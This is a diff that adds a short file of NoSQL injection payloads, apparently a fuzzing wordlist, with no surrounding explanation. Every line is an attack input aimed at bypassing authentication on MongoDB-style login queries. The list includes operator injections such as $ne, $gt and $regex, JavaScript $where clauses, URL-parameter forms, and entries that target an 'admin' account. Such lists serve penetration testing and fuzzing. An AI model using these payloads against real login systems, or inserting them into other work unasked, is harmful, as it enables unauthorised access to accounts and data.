@@ -1,0 +1,20 @@
+{"$ne": null}
+{"$ne": ""}
+{"$gt": ""}
+{"$gt": -1}
+{"$exists": true}
+{"$regex": ".*"}
+{"$where": "1==1"}
+{"$where": "this.password.length > 0"}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"$or": [{"username": "admin"}, {"password": {"$ne": 1}}]}
+{"username": {"$regex": "^adm"}}
+{"username": {"$regex": "^admin"}}
+[$ne]=1
+[$gt]=
+[$exists]=true
+{"username": {"$in": ["admin", "administrator"]}}
+{"$comment": "successful_login"}
+{"$and": [{"username": "admin"}, {"password": {"$ne": null}}]}
